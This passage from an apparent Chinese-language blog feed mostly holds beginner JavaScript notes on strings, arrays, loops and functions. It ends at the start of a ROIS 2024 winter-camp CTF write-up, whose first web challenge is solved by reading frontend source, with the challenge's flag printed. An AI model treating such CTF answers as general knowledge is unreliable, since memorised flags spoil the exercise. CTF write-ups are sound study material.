id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>​见前文：<strong>基础概念·对象（Object）</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dog = &#123; <span class="attr">name</span>: <span class="string">&quot;Spot&quot;</span>, <span class="attr">breed</span>: <span class="string">&quot;Dalmatian&quot;</span> &#125;;</span><br></pre></td></tr></table></figure><p>与C语言调用结构体的成员类似，使用<code>.</code>用来表示对象中的某个信息，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dog.<span class="property">name</span>;</span><br></pre></td></tr></table></figure><h3 id="Undefined-和-Null"><a href="#Undefined-和-Null" class="headerlink" title="Undefined 和 Null"></a>Undefined 和 Null</h3><p>Undefined 这个值表示变量不含有值。</p><p>可以通过将变量的值设置为 null 来清空变量。</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>概念:使用 <code>const</code> 声明的变量称为“常量”</p><p>当某个变量永远不会改变的时候，就可以使用 <code>const</code> 来声明，而不是<code>let</code>。</p><p>注意:</p><ul><li><p>常量的命名规范和变量一致</p></li><li><p>常量不允许重新赋值,声明的时候必须赋值(初始化)</p></li><li><p>小技巧:可以利用<code>const</code>进行自定义函数，语法如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> functionName = <span class="keyword">function</span>(<span class="params">parameters</span>) &#123;</span><br><span class="line">  <span class="comment">// 函数体</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h2><h3 id="包裹字符串"><a href="#包裹字符串" class="headerlink" title="包裹字符串"></a>包裹字符串</h3><p>在 JavaScript 中，可以选择单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）或反引号（&#96;&#96;&#96;）来包裹字符串。字符串的开头和结尾必须使用相同的符号进行包裹</p><p>使用单引号声明的字符串和使用双引号声明的字符串是相同的</p><p>使用反引号声明的字符串是一种特殊字符串，被称为<strong>模板字面量</strong>。在大多数情况下，模板字面量与普通字符串类似，但它具有一些特殊的属性：</p><p>1.<strong>字符串插值</strong>（String interpolation）：您可以在模板字符串中使用 <code>$&#123;&#125;</code> 语法来<strong>插入变量或表达式的值</strong>。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Wells&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> message = <span class="string">`My name is <span class="subst">$&#123;name&#125;</span>.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">// 输出 &quot;My name is Wells.&quot;</span></span><br></pre></td></tr></table></figure><p>但对于单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）可使用可以使用 <code>+</code> 运算符来连接字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> greeting = <span class="string">&quot;你好&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Wells&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(greeting + <span class="string">&quot;，&quot;</span> + name); <span class="comment">// &quot;你好，Wells&quot;</span></span><br></pre></td></tr></table></figure><p>2.多行字符串：模板字面量可以跨越多行，而<strong>无需使用特殊的转义字符或字符串连接操作符</strong>。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> multiLine = <span class="string">`This is a</span></span><br><span class="line"><span class="string">multi-line</span></span><br><span class="line"><span class="string">string.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(multiLine);</span><br></pre></td></tr></table></figure><blockquote><p>输出:<br>This is a<br>multi-line<br>string.</p></blockquote><p>在上面的例子中，模板字面量可以直接包含换行符，而不需要使用 <code>\n</code> 转义字符。</p><p>3.嵌套模板字面量：您可以在模板字面量中嵌套其他模板字面量，以构建更复杂的字符串。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nestedTemplate = <span class="string">`Hello, <span class="subst">$&#123;<span class="string">`My name is <span class="subst">$&#123;name&#125;</span>`</span>&#125;</span>.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nestedTemplate); <span class="comment">// 输出 &quot;Hello, My name is John.&quot;</span></span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>$&#123;name&#125;</code> 是嵌套在外部模板字面量中的。</p><h3 id="字符串包含引号"><a href="#字符串包含引号" class="headerlink" title="字符串包含引号"></a>字符串包含引号</h3><p>要实现字符串:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">She said &quot;I think so!&quot;</span><br></pre></td></tr></table></figure><p>此时不能再使用<code>&quot;&quot;</code>,一种常见的方法是换用其他字符来声明字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> goodQuotes1 = <span class="string">&#x27;She said &quot;I think so!&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> goodQuotes2 = <span class="string">`She said &quot;I think so!&quot;`</span>;</span><br></pre></td></tr></table></figure><p>另一种选择是<strong>转义</strong>存在问题的引号。转义字符意味着我们对它们做了一些处理，以确保它们被识别为文本，而不是代码的一部分。在 JavaScript 中，我们通过在字符之前加上反斜杠(<code>\</code>)来实现这一点。</p><h3 id="操作字符串"><a href="#操作字符串" class="headerlink" title="操作字符串"></a>操作字符串</h3><p>把字符串当作对象，就可以有大量的原型和方法编辑它。以下为常用的属性和操作</p><h4 id="获得字符串的长度"><a href="#获得字符串的长度" class="headerlink" title="获得字符串的长度"></a>获得字符串的长度</h4><p>这很简单 — 你可以很轻松的使用 <code>length</code>属性。尝试输入以下的两行代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> browserType = <span class="string">&quot;mozilla&quot;</span>;</span><br><span class="line">browserType.<span class="property">length</span>;</span><br></pre></td></tr></table></figure><p>因为”mozilla”的长度为 7 个字符,这个结果应该返回一个数字：7。说字符串的长度有用是有很多原因的，例如，你可能想算出一连串名字的长度，并用名字长度来作为名字排序的依据，亦或让一个用户知道他输入的用户名太长，已经超出了输入的字符串长度限制。</p><h4 id="检索特定字符串字符"><a href="#检索特定字符串字符" class="headerlink" title="检索特定字符串字符"></a>检索特定字符串字符</h4><p>可以使用方括号表示法(在变量名的末尾包含方括号<code>[ ]</code>)返回字符串中的任何字符.例如，要检索第一个字母，可以这样做：(如同数组)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserType[0];</span><br></pre></td></tr></table></figure><h4 id="在字符串中查找子字符串并提取它"><a href="#在字符串中查找子字符串并提取它" class="headerlink" title="在字符串中查找子字符串并提取它"></a>在字符串中查找子字符串并提取它</h4><p>有时候你会想要找出一个较小的字符串是否存在于一个较大的字符串中（我们通常会说一个字符串中存在一个子字符串）。这可以使用<code>indexOf()</code>方法来完成，该方法需要一个parameter (en-US)— 你想要搜索的子字符串。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserType.<span class="title function_">indexOf</span>(<span class="string">&quot;zilla&quot;</span>);</span><br></pre></td></tr></table></figure><p>返回的结果是子字符串起始的位置（原字符串第一个字母为0），若无结果将返回<code>-1</code></p><h4 id="转换大小写"><a href="#转换大小写" class="headerlink" title="转换大小写"></a>转换大小写</h4><p>字符串方法<code>toLowerCase()</code>和<code>toUpperCase()</code>字符串并将所有字符分别转换为小写或大写。</p><h4 id="替换字符串的某部分"><a href="#替换字符串的某部分" class="headerlink" title="替换字符串的某部分"></a>替换字符串的某部分</h4><p>使用<code>replace()</code>方法将字符串中的一个子字符串替换为另一个子字符串。</p><p>它需要两个参数 - 要被替换下的字符串和要被替换上的字符串。</p><h2 id="数组-1"><a href="#数组-1" class="headerlink" title="数组"></a>数组</h2><h3 id="获取数组长度"><a href="#获取数组长度" class="headerlink" title="获取数组长度"></a>获取数组长度</h3><p>使用 <code>length</code>属性获取数组的长度（数组中有多少项元素）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sequence = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>];</span><br><span class="line">sequence.<span class="property">length</span>;<span class="comment">// 将返回7</span></span><br></pre></td></tr></table></figure><h3 id="字符串与数组转换"><a href="#字符串与数组转换" class="headerlink" title="字符串与数组转换"></a>字符串与数组转换</h3><p>将数组看作成对象，可使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/split"><code>split()</code></a> 方法将一个长长的字符串中的原始数据，分成更有用的数据，存储在数组中，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myData = <span class="string">&quot;Manchester,London,Liverpool,Birmingham,Leeds,Carlisle&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> myArray = myData.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>);<span class="comment">//以，号来隔开</span></span><br><span class="line">myArray;<span class="comment">//输出[&#x27;Manchester&#x27;, &#x27;London&#x27;, &#x27;Liverpool&#x27;, &#x27;Birmingham&#x27;, &#x27;Leeds&#x27;, &#x27;Carlisle&#x27;]</span></span><br></pre></td></tr></table></figure><p>也可以使用 <code>join()</code>方法进行<strong>相反的操作</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myNewString = myArray.<span class="title function_">join</span>(<span class="string">&quot;,&quot;</span>);<span class="comment">//以，进行连接</span></span><br><span class="line">myNewString;<span class="comment">//输出 &#x27;Manchester,London,Liverpool,Birmingham,Leeds,Carlisle&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="添加和删除数组项"><a href="#添加和删除数组项" class="headerlink" title="添加和删除数组项"></a>添加和删除数组项</h3><p><strong>可以使用 <code>push()</code> 方法，在数组末尾添加项目</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myArray.<span class="title function_">push</span>(<span class="string">&quot;Cardiff&quot;</span>);<span class="comment">//增加一个</span></span><br><span class="line">myArray.<span class="title function_">push</span>(<span class="string">&quot;Bradford&quot;</span>, <span class="string">&quot;Brighton&quot;</span>);<span class="comment">//增加两个</span></span><br></pre></td></tr></table></figure><p>​当方法调用完成时，将<strong>返回值为数组的新长度</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newLength = myArray.<span class="title function_">push</span>(<span class="string">&quot;Bristol&quot;</span>);<span class="comment">//newLength为一个值</span></span><br></pre></td></tr></table></figure><p><strong>可以使用 <code>pop()</code>方法，在数组末尾删除一个项目</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myArray.<span class="title function_">pop</span>();</span><br></pre></td></tr></table></figure><p>​当方法调用完成时，将<strong>返回值已删除的项目</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> removedItem = myArray.<span class="title function_">pop</span>();<span class="comment">//removedItem为被删除的元素</span></span><br></pre></td></tr></table></figure><p>除此之外，还有<code>unshift()</code> 和 <code>shift()</code> 的方法分别作用于数组的开始进行添加或者删除元素，返回值与 <code>push()</code> 和 <code>pop()</code>方法相同</p><h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><h3 id="if…else-语法"><a href="#if…else-语法" class="headerlink" title="if…else 语法"></a>if…else 语法</h3><p>基本的 <code>if...else</code> 语法看起来这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">  <span class="comment">/* 条件为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">/* 否则，运行其他的代码 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加<code>&#123;&#125;</code>时，内可以添加多个语句，没有<code>&#123;&#125;</code>时，只会运行<code>if</code>下的第一个语句，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) </span><br><span class="line">  <span class="comment">/* 代码1; */</span></span><br><span class="line">  <span class="comment">/* 代码2; */</span></span><br></pre></td></tr></table></figure><p>只有条件为真时，<code>代码1</code>才会运行，不论条件是否为真，<code>代码2</code>都会运行。</p><h4 id="更多选择：else-if"><a href="#更多选择：else-if" class="headerlink" title="更多选择：else if"></a>更多选择：<code>else if</code></h4><p>使用 <code>else if</code>可以使判断更多的条件和选项，例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition1) &#123;</span><br><span class="line">  <span class="comment">/* 条件1为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition2) &#123;</span><br><span class="line">  <span class="comment">/* 条件2为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition3) &#123;</span><br><span class="line">  <span class="comment">/* 条件3为真时运行的代码 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">/* 否则，运行其他的代码 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a><code>switch</code> 语句</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (表达式/值) &#123;</span><br><span class="line">  <span class="keyword">case</span> 选择<span class="number">1</span>:</span><br><span class="line">    运行这段代码</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> 选择<span class="number">2</span>:</span><br><span class="line">    否则，运行这段代码</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// .......其他情况</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">default</span>:</span><br><span class="line">    出现未定义时的情况下，运行这段代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ol><li><code>switch</code>后的括号内可以是<strong>表达式或值</strong>。</li><li><code>default</code> 之后不需要再有选项，并且不需要 <code>break</code> 语句，因为之后没有任何运行代码。如果之前没有选项匹配，则运行 <code>default</code> 选项。</li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a><code>for</code>循环</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化操作; 开始/继续循环条件; 每次循环结束后的操作) &#123;</span><br><span class="line">  <span class="comment">// 每次循环运行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在关键字<code>for</code>括号内，我们有三个项目，以分号分隔：</p><ol><li><p>一个<strong>初始化器</strong> - 这通常是一个设置为一个数字的变量，它被递增来计算循环运行的次数。它也有时被称为<strong>计数变量</strong>。</p></li><li><p>一个<strong>开始&#x2F;继续循环条件</strong> - 如前面提到的，这个定义循环何时停止循环。这通常是一个表现为比较运算符的表达式，用于查看退出条件是否已满足的测试。</p></li><li><p>一个<strong>循环结束后的操作</strong> - 这总是被判断（或运行），每个循环已经通过一个完整的迭代消失时间。它通常用于增加（或在某些情况下递减）计数器变量，使其更接近退出条件值。</p></li></ol><h3 id="while-语句"><a href="#while-语句" class="headerlink" title="while 语句"></a><code>while</code> 语句</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (开始/继续循环条件) &#123;</span><br><span class="line">  <span class="comment">// 每次循环运行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-while-语句"><a href="#do-while-语句" class="headerlink" title="do ... while 语句"></a><code>do ... while</code> 语句</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="comment">// 每次循环运行的代码</span></span><br><span class="line">&#125; <span class="keyword">while</span> (继续循环条件)</span><br></pre></td></tr></table></figure><p>与<code>while</code> 循环不同的是<code>do...while</code> 循环会<strong>先进行一次循环</strong>然后再判断条件满不满足循环的条件决定是否继续循环</p><h3 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环</h3><h4 id="break-语句"><a href="#break-语句" class="headerlink" title="break 语句"></a><code>break</code> 语句</h4><p>使用<code>break</code> 语句将立即退出本层循环</p><h4 id="continue-语句"><a href="#continue-语句" class="headerlink" title="continue 语句"></a><code>continue</code> 语句</h4><p><code>continue</code> 语句与<code>break</code>类似，但不是完全跳出循环，而是<strong>跳过本次循环</strong><code>continue</code> 语句后的余下代码，<strong>条件成立的话执行下一个循环</strong>。</p><p>在<code>for</code>循环语句中，使用<code>continue</code>语句，<strong>跳过本次循环</strong><code>continue</code> 语句后的余下代码，<strong>仍然会进行<code>每次循环结束后的操作</code>的代码</strong></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数声明自定义函数"><a href="#函数声明自定义函数" class="headerlink" title="函数声明自定义函数"></a>函数声明自定义函数</h3><p><strong>语法</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">functionName</span>(<span class="params">parameters</span>) &#123;</span><br><span class="line">  <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：形参在<code>()</code>无需再使用<code>let</code>或者<code>var</code>声明，直接输入参数名即可</p><h3 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h3><p><strong>语法</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">functionName</span>(parameters)</span><br></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>创建一个<strong>没有名称的函数</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数叫做<strong>匿名函数</strong>——它没有函数名！它也不会自己做任何事情。通常将匿名函数与事件处理程序或者将匿名函数分配为变量的值一起使用。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myButton = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line"></span><br><span class="line">myButton.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;  <span class="comment">//将匿名函数与事件处理程序一起使用</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myGreeting = <span class="keyword">function</span> (<span class="params"></span>) &#123;  <span class="comment">//将匿名函数分配为变量的值</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p><strong>函数内</strong>定义的变量和其他东西作用域仅在函数内，不能被函数外的代码访问。</p><p>假设一个 HTML 文件，它调用两个外部 JavaScript 文件，并且它们<strong>都有一个使用相同名称定义的变量和函数</strong>，若调用这个函数，只能访问到首先被引用文件的这个函数（第二个文件被忽视了），例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Excerpt from my HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;first.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;second.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  greeting();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// first.js</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Chris&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greeting</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;: welcome to our company.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//偷懒写在一起了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// second.js</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Zaptec&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greeting</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;Our company is called &quot;</span> + name + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数都使用 <code>greeting()</code> 形式调用，但是你只能访问到 first.js 文件的<code>greeting()</code>函数（第二个文件被忽视了）。另外，第二次尝试使用 <code>let</code> 关键字定义 <code>name</code> 变量导致了一个错误。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>函数的返回值可以是<strong>任意类型的数据</strong>，例如数组、对象等数据类型</p><h1 id="一些函数和方法"><a href="#一些函数和方法" class="headerlink" title="一些函数和方法"></a><strong>一些函数和方法</strong></h1><h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><h3 id="1-Number-函数"><a href="#1-Number-函数" class="headerlink" title="1.Number()函数"></a>1.<code>Number()</code>函数</h3><p>​将其参数转换为数字</p><h3 id="2-String-函数"><a href="#2-String-函数" class="headerlink" title="2.String()函数"></a>2.<code>String()</code>函数</h3><p>​将其参数转换为字符串</p><h3 id="3-Math-random"><a href="#3-Math-random" class="headerlink" title="3.Math.random()"></a>3.Math.random()</h3><p><strong>Math.random()是令系统随机选取大于等于 0.0 且小于 1.0 的伪随机 double 值</strong></p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="3-Window：alert-方法"><a href="#3-Window：alert-方法" class="headerlink" title="3.Window：alert() 方法"></a>3.Window：alert() 方法</h3><p><code>window.alert()</code> 令浏览器显示一个带有可选的信息的对话框，并等待用户离开该对话框。</p><p>在某些情况下（例如，当用户切换标签时）浏览器可能不会实际显示一个对话框，或者不等待用户离开对话框。</p><p><strong>语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert()</span><br><span class="line">alert(message)</span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><ul><li><p><code>message</code>可选</p><p>是要显示在警告对话框中的字符串，如果传入其他类型的值，会转换成字符串。</p></li></ul><p>返回值：无</p><p>完整内置对象以及其相关方法列表</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects">JavaScript 标准内置对象 - JavaScript | MDN (mozilla.org)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JavaScript 是一种可插入 HTML 页面的轻量级的编程语言。&lt;/p&gt;
&lt;h1 id=&quot;初识JavaScript&quot;&gt;&lt;a href=&quot;#初识JavaScript&quot; class=&quot;headerlink&quot; title=&quot;初识JavaScript&quot;&gt;&lt;/a&gt;&lt;strong</summary>
      
    
    
    
    <category term="编程" scheme="https://we11s.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="开发" scheme="https://we11s.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>ROIS2024冬令营</title>
    <link href="https://we11s.github.io/posts/3320244556/"/>
    <id>https://we11s.github.io/posts/3320244556/</id>
    <published>2024-01-27T07:42:07.000Z</published>
    <updated>2024-03-05T14:21:04.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-vue-terminal"><a href="#1-vue-terminal" class="headerlink" title="1.vue-terminal"></a>1.vue-terminal</h3><p><strong>解法一</strong>：</p><p>​老老实实用<code>cd</code>、<code>ls</code>、<code>cat</code>命令一步步找出下一个url</p><p><strong>解法二</strong>：</p><p>​直接找网页源码，无后端，所以flag在前端文件里，一通瞎找最后在<code>app.2fa07618.js</code>找到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">                   <span class="title function_">onExecCmd</span>(<span class="params">n, e, t, o</span>) &#123;</span><br><span class="line">                       <span class="string">&quot;flag&quot;</span> === n ? <span class="title function_">t</span>(&#123;</span><br><span class="line">                           <span class="attr">type</span>: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">                           <span class="attr">content</span>: <span class="string">&#x27;\n        &lt;ul class=&quot;custom-content&quot;&gt;\n          &lt;li class=&quot;t-dir&quot;&gt;flag: ROIS&#123;just_a_simple_linux_command_in_CTF&#125;&lt;/li&gt;\n        &lt;/ul&gt;\n        &lt;br&gt;\n        &#x27;</span></span><br><span class="line">                       &#125;) : <span class="title function_">o</span>(<span class="string">&quot;Unknown command&quot;</span>)</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure><h3 id="2-ez-maze"><a href="#2-ez-maze" class="headerlink" 